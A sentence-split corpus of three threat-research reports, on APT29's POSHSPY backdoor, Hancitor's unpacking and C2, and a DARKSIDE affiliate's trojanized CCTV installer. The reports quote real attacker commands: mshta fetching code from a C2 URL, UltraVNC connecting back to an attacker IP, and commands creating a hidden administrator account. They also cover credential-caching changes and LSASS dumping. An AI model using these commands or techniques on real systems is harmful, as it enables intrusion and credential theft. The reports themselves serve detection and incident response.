sentence.8007: title: Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY) url: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html Mandiant has observed APT29 using a stealthy backdoor that we call POSHSPY.
sentence.8008: POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI).
sentence.8009: In the investigations Mandiant has conducted, it appeared that APT29 deployed POSHSPY as a secondary backdoor for use if they lost access to their primary backdoors.
sentence.8010: POSHSPY makes the most of using built-in Windows features – so-called “living off the land” – to make an especially stealthy backdoor.
sentence.8011: POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI.
sentence.8012: Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory.
sentence.8013: The backdoor's infrequent beaconing, traffic obfuscation, extensive encryption and use of geographically local, legitimate websites for command and control (C2) make identification of its network traffic difficult.
sentence.8014: Every aspect of POSHSPY is efficient and covert.
sentence.8015: Mandiant initially identified an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015.
sentence.8016: Later in that same engagement, the attacker updated the deployment of the backdoor to use WMI for storage and persistence.
sentence.8017: Mandiant has since identified POSHSPY in several other environments compromised by APT29 over the past two years.
sentence.8018: We first discussed APT29’s use of this backdoor as part of our “No Easy Breach” talk.
sentence.8019: For additional details on how we first identified this backdoor, and the epic investigation it was part of, see the slides and presentation.
sentence.8020: Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000.
sentence.8021: WMI provides many administrative capabilities on local and remote systems, including querying system information, starting and stopping processes, and setting conditional triggers.
sentence.8022: WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell.
sentence.8023: Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\wbem\Repository directory.
sentence.8024: WMI classes are the primary structure within WMI.
sentence.8025: WMI classes can contain methods (code) and properties (data).
sentence.8026: Users with sufficient system-level privileges can define custom classes or extend the functionality of the many default classes.
sentence.8027: WMI permanent event subscriptions can be used to trigger actions when specified conditions are met.
sentence.8028: Attackers often use this functionality to persist the execution of backdoors at system start up.
sentence.8029: Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding.
sentence.8030: WMI Consumers specify an action to be performed, including executing a command, running a script, adding an entry to a log, or sending an email.
sentence.8031: WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others.
sentence.8032: A FilterToConsumerBinding associates Consumers to Filters.
sentence.8033: Creating a WMI permanent event subscription requires administrative privileges on a system.
sentence.8034: We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code.
sentence.8035: To store the code, APT29 created a new WMI class and added a text property to it in order to store a string value.
sentence.8036: APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property.
sentence.8037: APT29 then created a WMI event subscription in order to execute the backdoor.
sentence.8038: The subscription was configured to run a PowerShell command that read, decrypted, and executed the backdoor code directly from the new WMI property.
sentence.8039: This allowed them to install a persistent backdoor without leaving any artifacts on the system’s hard drive, outside of the WMI repository.
sentence.8040: This “fileless” backdoor methodology made the identification of the backdoor much more difficult using standard host analysis techniques.
sentence.8041: POSHSPY WMI Component The WMI component of the POSHSPY backdoor leverages a Filter to execute the PowerShell component of the backdoor on a regular basis.
sentence.8042: In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.
sentence.8043: Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition
sentence.8044: The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration.
sentence.8045: The WindowsParentalControlsMigration consumer was configured to silently execute a base64-encoded PowerShell command.
sentence.8046: Upon execution, this command extracted, decrypted, and executed the PowerShell backdoor payload stored in the HiveUploadTask text property of the RacTask class.
sentence.8047: The PowerShell command contained the payload storage location and encryption keys.
sentence.8048: Figure 2 displays the command, called the “CommandLineTemplate”, executed by the WindowsParentalControlsMigration consumer.
sentence.8050: CommandLineTemplate Figure 3 contains the decoded PowerShell command from the “CommandLineTemplate.” Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here.
sentence.8051: The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries.
sentence.8052: The backdoor contains several notable capabilities, including: 1.
sentence.8053: Downloading and executing PowerShell code as an EncodedCommand 2.
sentence.8054: Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary file name, using the EXE extension 3.
sentence.8055: Modifying the Standard Information timestamps (created, modified, accessed) of every downloaded executable to match a randomly selected file from the System32 directory that was created prior to 2013 4.
sentence.8056: Encrypting communications using AES and RSA public key cryptography 5.
sentence.8057: Deriving C2 URLs from a Domain Generation Algorithm (DGA) using lists of domain names, subdomains, top-level domains (TLDs), Uniform Resource Identifiers (URIs), file names, and file extensions 6.
sentence.8058: Using a custom User Agent string or the system's User Agent string derived from urlmon.dll 7.
sentence.8059: Using either custom cookie names and values or randomly-generated cookie names and values for each network connection 8.
sentence.8061: Appending a file signature header to all encrypted data, prior to upload or download, by randomly selecting from the file types: ICO GIF JPG PNG MP3 BMP The sample in this example used 11 legitimate domains owned by an organization located near the victim.
sentence.8062: When combined with the other options in the DGA, 550 unique C2 URLs could be generated.
sentence.8063: Infrequent beaconing, use of DGA and compromised infrastructure for C2, and appended file headers used to bypass content inspection made this backdoor difficult to identify using typical network monitoring techniques.
sentence.8064: Conclusion POSHSPY is an excellent example of the skill and craftiness of APT29.
sentence.8065: By “living off the land” they were able to make an extremely discrete backdoor that they can deploy alongside their more conventional and noisier backdoor families, in order to help ensure persistence even after remediation.
sentence.8066: As stealthy as POSHSPY can be, it comes to light quickly if you know where to look.
sentence.8067: Enabling and monitoring enhanced PowerShell logging can capture malicious code as it executes and legitimate WMI persistence is so rare that malicious persistence quickly stands out when enumerating it across an environment.
sentence.8068: This is one of several sneaky backdoor families that we have identified, including an off-the-shelf domain fronting backdoor and HAMMERTOSS.
sentence.8069: When responding to an APT29 breach, it is vital to increase visibility, fully scope the incident before responding and thoroughly analyze accessed systems that don't contain known malware.
sentence.8070: Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment.
sentence.8071: This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics.
sentence.8072: This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations.
sentence.8073: The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence.
sentence.8074: title: Hancitor Infection Chain Analysis: An Examination of its Unpacking Routine and Execution Techniques url: https://threatresearch.ext.hp.com/hancitors-return-analyzing-its-latest-infection-chain/ In this article, we describe how Hancitor compromises systems based on its infection chain observed in January and February 2021.
sentence.8075: We cover its unpacking routine, information gathering and command and control (C2) functions, and payload execution techniques.
sentence.8076: The malware Hancitor Hancitor (aka Chanitor) is a downloader which is used to gain initial access to a victim’s computer.
sentence.8077: Its main purpose is to download and execute a second stage malware payload from one of multiple encrypted URLs contained in the malware itself.
sentence.8078: This downloader was first seen in 2014 commonly deploying Pony and Vawtrak malware.
sentence.8079: Like many other malware families we saw Hancitor become active again in early 2021 following the festive period.
sentence.8080: The first Hancitor malicious spam wave of 2021 started on 12 January, where the malware was distributed as email Word document attachments.
sentence.8081: Since then, almost every workday we have seen Hancitor activity.
sentence.8082: Word Dropper used by Hancitor On Tuesday 12 January, phishing emails with hyperlinks leading to Word documents reached users’ inboxes.
sentence.8083: The Word documents were droppers that install and execute the Hancitor downloader.
sentence.8084: When opened, the user sees a social engineering image telling them that they must click the “Enable editing” button to see the document’s contents.
sentence.8085: Figure 1 – Word document lure requesting the user to run the VBA macro.
sentence.8086: Analyzing the attachment using oledump shows that not only VBA macros but also an Object Linking and Embedding (OLE) object are embedded in the document.
sentence.8087: To find out how the OLE object is used and how the malware infection happens, we analyzed the VBA macros using Word’s developer tools. Figure 2 – Output from oledump showing the VBA macro in the Word document.
sentence.8088: The VBA code is distributed over several different modules inside the document and is executed by the Document.
sentence.8090: The OLE object is then saved with a “.tmp” file extension into one of the local temp folders under “C:\Users\[username]\AppData\Local\Temp”.
sentence.8091: As the VBA code does not know where the file was stored, it then recursively searches through all local temp folders.
sentence.8092: Figure 3 – VBA macro which moves the tmp file to the templates folder as a DLL.
sentence.8093: Once the “.tmp” file is found, it is moved and renamed to the Office templates folder (C:\Users\username\AppData\Roaming\Microsoft\Templates) as “W0rd.dll” and loaded using rundll32.exe.
sentence.8094: As a second argument, the macro passes the entry function “DllUnregisterServer” to rundll32.exe so that the execution starts correctly.
sentence.8095: Figure 4 – VBA macro which runs rundll32.exe to load the malware.
sentence.8096: Packed DLL analysis Briefly looking at the DLL characteristics shows that there are two unknown sections, which could be an indicator of packing being used to obfuscate the malware.
sentence.8097: Opening the DLL in a debugger and running through the program, focusing on what is happening with the suspicious sections confirms that there is indeed some sort of unpacking happening.
sentence.8098: Figure 5 – Sections of the PE file (“W0rd.dll”).
sentence.8099: Although the unpacking procedure happens in multiple steps, it can be described in two broad stages: Decryption Stage 1 First, the malware allocates new memory which is used to copy the data from section “.rdata4” into it.
sentence.8100: The data, however, is not copied identically from the section to the new memory region because the bytes containing 0x21 are omitted.
sentence.8101: As soon as the copy operation is finished, the decryption process starts.
sentence.8102: The first four bytes at the beginning of the newly allocated memory indicate the length of the data that will be decrypted.
sentence.8103: The algorithm to decrypt the data is simple.
sentence.8104: It uses an XOR operation with the key and plaintext being incremented after each four-byte operation.
sentence.8105: To start, the key is initialized with 0xD508.
sentence.8106: A replication of this algorithm, written in Python, can be found in our GitHub repository.
sentence.8107: Figure 6 – Data view of the section containing the encrypted malware.
sentence.8108: Looking at the decrypted data and the behavior of the program, we can see that there are multiple areas containing different types of information.
sentence.8109: The names of Windows API functions are stored in the first 150 bytes.
sentence.8110: The area after this contains encrypted data.
sentence.8111: Finally, the executable code used to decrypt the encrypted data is located at the end of the section.
sentence.8112: Figure 7 shows the structure of the memory section.
sentence.8113: Figure 7 – Structure of the encrypted section.
sentence.8114: The API function located at the beginning of the memory section are resolved using GetProcAddress.
sentence.8115: However, instead of being resolved within kernel32.dll, they are resolved in kernelbase.dll.
sentence.8116: This is important to note because when debugging Hancitor samples, breakpoints are most commonly set on functions from kernel32.dll and thus would not be triggered during execution.
sentence.8117: After resolving the functions, the second decryption stage occurs.
sentence.8119: , the decrypted memory structure contains executable code.
sentence.8120: As expected, the instruction pointer jumps directly to this section, which also contains the decryption algorithm for the second stage.
sentence.8121: Before the decryption starts, new memory is allocated and the encrypted data from stage 1 is copied to it.
sentence.8122: The decryption algorithm of stage 2 is generally the same, but uses 0x3E9 as the initialization key.
sentence.8123: The output of this decryption leads us to a PE file.
sentence.8124: Figure 8 – Overview of Hancitor’s decryption procedure.
sentence.8125: The copy procedure is done section by section to bring the executable into the loaded form.
sentence.8126: This technique is called self-injection or PE overwrite.
sentence.8127: To make the new image runnable, several Windows API functions are resolved using GetProcAddress and directly patched into the memory of the loaded executable.
sentence.8128: These function addresses vary from installation to installation, so this patching cannot be done by a static unpacker.
sentence.8129: For all the other decryption procedures described, you can find a static unpacker script in our GitHub repository.
sentence.8130: To effectively run the new payload, a return to the correct DLL entry point is made.
sentence.8131: It is important to note that the AddressOfEntryPoint in the optional header does not match the exported functions DllRegisterServer or DllUnregisterServer and it is necessary to run one of the exported functions to start the malware.
sentence.8132: When using x32dbg to analyze the sample, simply patching the AddressOfEntryPoint to one of the exported functions makes the DLL runnable.
sentence.8133: Running Hancitor Malware As soon as the unpacked executable is running, the malware gathers information about the infected system.
sentence.8134: The following disassembly shows calls to multiple functions used to collect the information.
sentence.8135: Figure 9 – x86 disassembly of Hancitor’s information gathering function.
sentence.8136: First, the malware calls a function we named “getComputerInfo”.
sentence.8137: This function obtains the username, the computer name and the domain of infected system.
sentence.8138: The subsequent functions collect additional information such as the machine’s public IP address, domain trust information and the computer architecture.
sentence.8139: The malware identifies the computer’s public IP address by making a HTTP GET request to “hxxp://api.ipify[.]org”, a free public IP address API.
sentence.8140: All the collected information is then put together into a query string which is generated based on the computer architecture.
sentence.8141: Figure 10 – Query string containing system information before being sent to the C2.
sentence.8142: To determine the command and control (C2) servers waiting for the data to be sent to, the malware calls a decryption function that uses the RC4 algorithm to get a list of potential C2 URLs.
sentence.8143: Figure 11 – URL and build decryption function.
sentence.8144: After successfully decrypting the C2 URLs, the data is sent there using a HTTP POST request adding the constructed query string as data.
sentence.8145: To increase the probability of reaching an active server, the malware iterates over all the decrypted C2 URLs and tries to reach all of them until one of them sends a response.
sentence.8147: We assume that based on the received data the C2 server responds with either a simple string which can be decrypted to an active malware download server or with garbage data in the form of a simple string.
sentence.8148: Although the decoding algorithm of the C2 response looks quite complex, it is actually Base64 decoding, followed by an XOR operation using the key 0x7A.
sentence.8149: If the decryption leads to a valid URL, the malware initiates a download, which delivers an executable.
sentence.8150: To execute the binary, Hancitor uses one of the following techniques: Create Process Create Thread Process Hollowing Thread Execution Hijacking Create Process If the method “Create Process” is chosen, then the malware writes the retrieved executable to disk into the temp folder and executes it using rundll32.exe with “start” as the argument for the entry function.
sentence.8151: Create Thread The Create Thread method is as straightforward as Create Process.
sentence.8152: The malware simply allocates some memory, writes the malware into it and creates a new thread from it.
sentence.8153: Process Hollowing If the Process Hollowing method is used, a new svchost.exe process is created in a suspended state.
sentence.8154: The malware then allocates new memory in the newly-created process, writes the executable to it and executes it in a new thread.
sentence.8156: Thread Execution Hijacking The final execution method Hancitor supports is Thread Execution Hijacking.
sentence.8157: This method is mostly the same as the above described Process Injection method.
sentence.8158: The only difference is that the malware replaces the thread context with the downloaded executable and resumes it afterwards.
sentence.8159: Conclusion This article should give a good overview of Hancitor’s capabilities and behavior as of February 2021. Indicators of Compromise (IOCs)
sentence.8160: A list of IOCs is also available in the HP Threat Research GitHub repository.

sentence.8162: title: Smoking Out a DARKSIDE Affiliate’s Supply Chain Software Compromise url: https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html Mandiant observed DARKSIDE affiliate UNC2465 accessing at least one victim through a Trojanized software installer downloaded from a legitimate website.
sentence.8163: While this victim organization detected the intrusion, engaged Mandiant for incident response, and avoided ransomware, others may be at risk.
sentence.8164: As reported in the Mandiant post, "Shining a Light on DARKSIDE Ransomware Operations," Mandiant Consulting has investigated intrusions involving several DARKSIDE affiliates.
sentence.8165: UNC2465 is one of those DARKSIDE affiliates that Mandiant believes has been active since at least March 2020.
sentence.8166: The intrusion that is detailed in this post began on May 18, 2021, which occurred days after the publicly reported shutdown of the overall DARKSIDE program (Mandiant Advantage background).
sentence.8167: While no ransomware was observed here, Mandiant believes that affiliate groups that have conducted DARKSIDE intrusions may use multiple ransomware affiliate programs and can switch between them at will.
sentence.8168: Sometime in May 2021 or earlier, UNC2465 likely Trojanized two software install packages on a CCTV security camera provider website.
sentence.8169: Mandiant determined the installers were malicious in early June and notified the CCTV company of a potential website compromise, which may have allowed UNC2465 to replace legitimate downloads with the Trojanized ones.
sentence.8170: While Mandiant does not suspect many victims were compromised, this technique is being reported for broader awareness.
sentence.8171: Software supply chain attacks can vary greatly in sophistication, from the recent FireEye-discovered SolarWinds attacks to attacks such as this targeting smaller providers.
sentence.8172: A software supply chain attack allows a single intrusion to obtain the benefit of access to all of the organizations that run that victim company’s software; in this case, an installer, rather than the software itself, was modified by UNC2465.
sentence.8173: DARKSIDE RaaS In mid-May 2021, Mandiant observed multiple threat actors cite an announcement that appeared to be shared with DARKSIDE RaaS affiliates by the operators of the service.
sentence.8174: This announcement stated that they lost access to their infrastructure, including their blog, payment, and content distribution network (CDN) servers, and would be closing their service.
sentence.8175: The post cited law enforcement pressure and pressure from the United States for this decision.
sentence.8176: Multiple users on underground forums have since come forward claiming to be unpaid DARKSIDE affiliates, and in some cases privately provided evidence to forum administrators who confirmed that their claims were legitimate.
sentence.8177: There are some actors who have speculated that the DARKSIDE operator’s decision to close could be an exit scam.
sentence.8178: While we have not seen evidence suggesting that the operators of the DARKSIDE service have resumed operations, we anticipate that at least some of the former affiliates of the DARKSIDE service will likely identify different ransomware or malware offerings to use within their own operations.
sentence.8179: Notably, Mandiant has continued to observe a steady increase in the number of publicly named victims on ransomware shaming sites within the past month.
sentence.8180: Despite the recent ban of ransomware-related posts within underground forums, threat actors can still leverage private chats and connections to identify ransomware services.
sentence.8181: As one example, in mid-May 2021, the operator of the SODINOKIBI (aka REvil) RaaS indicated that multiple affiliates from other RaaS platforms that had shut down were switching to their service.
sentence.8182: Based on the perceived profitability of these operations, it is almost certain that numerous threat actors will continue to conduct widespread ransomware operations for the foreseeable future.
sentence.8183: Background In June 2021, Mandiant Consulting was engaged to respond to an intrusion.
sentence.8184: During analysis, Mandiant determined the initial vector was a trojanized security camera PVR installer from a legitimate website.
sentence.8185: Mandiant attributed the overall intrusion activity to DARKSIDE affiliate UNC2465 due to continued use of infrastructure and tooling since October 2020.
sentence.8186: On May 18, 2021, a user in the affected organization browsed to the Trojanized link and downloaded the ZIP.
sentence.8187: Upon installing the software, a chain of downloads and scripts were executed, leading to SMOKEDHAM and later NGROK on the victim’s computer.
sentence.8188: Additional malware use such as BEACON, and lateral movement also occurred.
sentence.8189: Mandiant believes the Trojanized software was available from May 18, 2021, through June 8, 2021.
sentence.8190: Pivoting on the slightly modified, but benign, MSHTA.exe application in VirusTotal, Mandiant identified a second installer package with the MD5 hash, e9ed774517e129a170cdb856bd13e7e8 (SVStation_Win64-B1130.1.0.0.exe), from May 26, 2021, which also connects out the same URL as the Trojanized SmartPSS installer.
sentence.8191: Supply Chain Intrusion Cycle Figure 1: Intrusion cycle Phase 1: Trojanized Installer Download Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before.
sentence.8192: The downloaded file was extracted to C:\Users\[username]\Downloads\06212019-General-SMARTPSS-Win32-ChnEng-IS\General_SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023\SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe.
sentence.8193: Mandiant confirmed the user intended to download, install, and use the SmartPSS software.
sentence.8194: Figure 2 shows an image of the download page used for SmartPSS software.
sentence.8195: Figure 2: SmartPSS download page Phase 2: Nullsoft Installer
sentence.8196: The installer executable is a Nullsoft installer that when executed wrote two files to C:\ProgramData\SMARTPSS-Win32_ChnEng_IS.
sentence.8197: We were able to extract the malicious installer script and files for analysis using 7-Zip.
sentence.8198: The relevant section of this installer script is shown below in Figure 3. Figure 3: Nullsoft installer script section The installer script created two files: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General.exe (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe (c180f493ce2e609c92f4a66de9f02ed6).
sentence.8199: The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.
sentence.8200: The latter is launched with a command line URL executing the content.
sentence.8201: The smartpss.exe file contained metadata describing itself as MSHTA.exe from Microsoft, a legitimate operating system component, but the MD5 hash was unknown.
sentence.8202: Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided.
sentence.8203: This functionality matched the behavior of the legitimate MSHTA.exe despite the hash discrepancy.
sentence.8204: Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4. Figure 4: CyberChef diff between MSHTA.exe and smartpss.exe Phase 3: Downloaded VBScript and PowerShell Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line.
sentence.8205: Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.
sentence.8206: According to RiskIQ, sdoc[.]xyz shares a registrant with koliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions.
sentence.8207: C:\PROGRAMDATA\SMARTPSS-Win32_ChnEng_IS\smartpss.exe hxxp://sdoc[.]xyz/ID-508260156241 The execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm that was written to a temporary INetCache directory.
sentence.8208: Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.
sentence.8211: At the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code.
sentence.8212: It is not clear if sdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant.
sentence.8213: A PCAP from a sandbox execution on VirusTotal from May 26, 2021, also showed benign content being served.
sentence.8214: Figure 5: PCAP from e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning malicious content Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6.
sentence.8215: Figure 6: SMOKEDHAM downloader Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler.
sentence.8217: /fullpaths @'C:\Users\ [username]\AppData\Local\Temp\qnxfhfim\qnxfhfim.cmdline' Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file. .../t
sentence.8219: After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.
sentence.8220: Phase 4: SMOKEDHAM Dropper The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.
sentence.8221: The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.
sentence.8222: The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable.
sentence.8223: In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.
sentence.8224: The SMOKEDHAM backdoor source code is embedded as an encrypted string.
sentence.8225: The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.
sentence.8226: After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point.
sentence.8227: The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.
sentence.8228: Figure 7 shows the deobfuscated SMOKEDHAM dropper.
sentence.8229: Figure 7: SMOKEDHAM dropper Phase 5: SMOKEDHAM Backdoor SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture.
sentence.8230: The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.
sentence.8231: SMOKEDHAM Network Communications SMOKEDHAM communicates with its C2 server using HTTPS.
sentence.8232: The backdoor uses domain fronting to obfuscate its true C2 server.
sentence.8233: The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor.
sentence.8234: Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication.
sentence.8235: The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.
sentence.8236: The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.
sentence.8237: The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.
sentence.8238: The ID field contains a unique value generated by the backdoor for the target system.
sentence.8239: The UUID field may contain a unique value used to track command output or be empty.
sentence.8240: When the C2 server responds with a command to execute, it sets the UUID field to a unique value.
sentence.8241: SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.
sentence.8242: The Data field may contain RC4-encrypted, Base64-encoded command data or be empty.
sentence.8243: The backdoor uses the Data field to send command output to its C2 server.
sentence.8244: The C2 server uses the Data field to send commands to the backdoor to execute.
sentence.8245: The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.
sentence.8246: Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption.
sentence.8247: SMOKEDHAM Commands SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.
sentence.8248: The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1. Keyword Action delay Update its sleep interval screenshot Upload a screen capture to its C2 server via a subsequent HTTP POST request exit Terminate Table 1: Plaintext command data keywords If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.
sentence.8249: The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.
sentence.8250: In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.
sentence.8251: The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.
sentence.8252: SMOKEDHAM In Action SMOKEDHAM was observed executing commands on the target system using PowerShell.
sentence.8253: The following commands were used to collect information about the system and logged in users.
sentence.8254: net.exe user net.exe users whoami.exe whoami.exe /priv systeminfo.exe
sentence.8255: The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen.
sentence.8256: net.exe user DefaultUser REDACTED /ADD net.exe localgroup Administrators DefaultUser /ADD reg.exe ADD 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /v
sentence.8259: The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication.
sentence.8264: 1 /f Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential to enable credential caching.
sentence.8265: Phase 6: Follow-on Activity SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.
sentence.8266: These files were saved to the %APPDATA%\Chrome\ directory.
sentence.8267: The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1.
sentence.8268: Figure 8: Contents of UltraVNC.ini SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.
sentence.8270: APPDATA%\Chrome\winvnc.exe' -autoreconnect ID:15000151 -connect 81.91.177[.]54[:]7234 –run SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key.
sentence.8272: %appdata%\Chrome\winvnc.exe NGROK Configuration SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.
sentence.8273: These files were stored in the C:\ProgramData\WindNT\ directory.
sentence.8274: NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.
sentence.8275: Figure 9 and Figure 10 show the contents of VirtualHost.vbs and ngrok.yml files, respectively.
sentence.8276: Figure 9: Contents of VirtualHost.vbs Figure 10: Contents of ngrok.yml The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.
sentence.8277: SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key.
sentence.8279: C:\ProgramData\WindNT\VirtualHost.vbs Keylogger Deployment This attacker utilized an additional keylogging utility named C:\ProgramData\psh\console.exe.
sentence.8280: The keylogging utility was configured to capture and record keystrokes to C:\ProgramData\psh\System32Log.txt.
sentence.8281: Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.
sentence.8282: The downloaded files were named desktop.lnk and console.lnk, respectively, and were placed in the following persistence locations: C:\Users\[username]\Start Menu\Programs\Startup\desktop.lnk
sentence.8284: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\console.lnk Cobalt Strike Beacon The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe.
sentence.8285: Update.exe was a Go based dropper created using the ScareCrow framework.
sentence.8286: The attacker executed C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe using Command Prompt.
sentence.8288: The execution of ScareCrow framework dropper C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\ProgramData\Cisco\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.
sentence.8289: Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ directory.
sentence.8290: Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload.
sentence.8291: LSASS Dumping and Lateral Movement Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.
sentence.8292: DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\ProgramData\psh\ directory.
sentence.8293: From this point, the attacker was observed moving laterally to different systems in the environment using Remote Desktop Protocol (RDP) connections.
sentence.8294: Conclusion UNC2465 established initial access via a Trojanized installer executed by an unsuspecting user.
sentence.8295: UNC2465 interactively established an NGROK tunnel and began moving laterally in less than 24 hours.
sentence.8296: Five days later, UNC2465 returned and deployed additional tools such as a keylogger, Cobalt Strike BEACON, and conducted credential harvesting via dumping LSASS memory.
sentence.8297: Ransomware groups continue to adapt and pursue opportunistic access to victims.
sentence.8298: UNC2465’s move from drive-by attacks on website visitors or phishing emails to this software supply chain attack shows a concerning shift that presents new challenges for detection.
